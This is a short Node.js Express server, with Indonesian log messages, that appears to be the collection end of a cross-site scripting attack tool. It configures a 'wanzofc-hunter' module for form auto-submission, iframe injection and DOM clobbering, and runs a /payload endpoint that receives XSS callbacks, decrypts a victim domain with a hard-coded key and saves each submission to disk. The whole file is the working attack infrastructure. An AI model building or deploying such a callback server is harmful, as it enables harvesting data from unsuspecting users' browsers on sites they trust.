const express = require('express');
const wanzofcHunter = require('wanzofc-hunter');
const path = require('path');
const fs = require('fs');
const CryptoJS = require('crypto-js');


const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

wanzofcHunter.configure(app, {
    callbackURL: '/payload', 
    autoSubmitForms: true,
    iframeInjection: true,
    chaosMode: true,
    domClobbering: true,
    domClobberingLevel: 'advanced'
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});


app.post('/payload', (req, res) => {
  console.log('Payload diterima:', req.body);


   const secretKey = 'ONLYWANZOFC';

 try {
     const decryptedBytes = CryptoJS.AES.decrypt(req.body.xss, secretKey);
        const decryptedDomain = decryptedBytes.toString(CryptoJS.enc.Utf8);

     console.log('Decrypted Domain:', decryptedDomain);

        const timestamp = Date.now();
        const filename = `payload-${timestamp}.json`;
        const dataToWrite = { ...req.body, decryptedDomain };


     fs.writeFile(filename, JSON.stringify(dataToWrite, null, 2), (err) => {
            if (err) {
                 console.error('Gagal menyimpan payload:', err);
                return res.status(500).send('Internal Server Error');
            }
            console.log(`Payload disimpan ke ${filename}`);
            res.send('Payload diterima dan disimpan!');
        });

 } catch (error) {
        console.error('Error decrypting:', error);
         res.status(500).send("Decryption Error");
    }
});


const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server berjalan di: http://localhost:${port}`);
});
